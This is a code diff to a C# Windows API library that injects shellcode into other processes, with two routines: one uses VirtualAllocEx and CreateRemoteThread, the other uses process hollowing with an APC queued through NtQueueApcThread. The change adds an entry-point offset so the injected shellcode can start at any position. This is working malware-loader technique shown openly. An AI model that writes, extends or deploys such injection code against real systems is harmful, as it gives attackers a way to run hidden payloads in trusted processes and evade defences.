@@ -175,7 +175,7 @@ namespace WinAPI.PInvoke
             return ret;
         }
 
-        public static void InjectCreateRemoteThread(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode)
+        public static void InjectCreateRemoteThread(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode, int entrypointOffset = 0)
         {
             var baseAddress = Kernel32.VirtualAllocEx(
                 processHandle,
@@ -207,13 +207,13 @@ namespace WinAPI.PInvoke
 
             IntPtr threadres = IntPtr.Zero;
 
-            IntPtr thread = Kernel32.CreateRemoteThread(processHandle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);
+            IntPtr thread = Kernel32.CreateRemoteThread(processHandle, IntPtr.Zero, 0, baseAddress + entrypointOffset, IntPtr.Zero, 0, out threadres);
 
             if (thread == IntPtr.Zero)
                 throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
         }
 
-        public static void InjectProcessHollowingWithAPC(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode)
+        public static void InjectProcessHollowingWithAPC(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode, int entrypointOffset = 0)
         {
             const uint GENERIC_ALL = 0x10000000;
             const uint PAGE_EXECUTE_READWRITE = 0x40;
@@ -270,7 +270,7 @@ namespace WinAPI.PInvoke
 
             var res = Native.NtQueueApcThread(
             threadHandle,
-            hRemoteBaseAddress,
+            hRemoteBaseAddress + entrypointOffset,
             IntPtr.Zero,
             IntPtr.Zero,
             IntPtr.Zero);
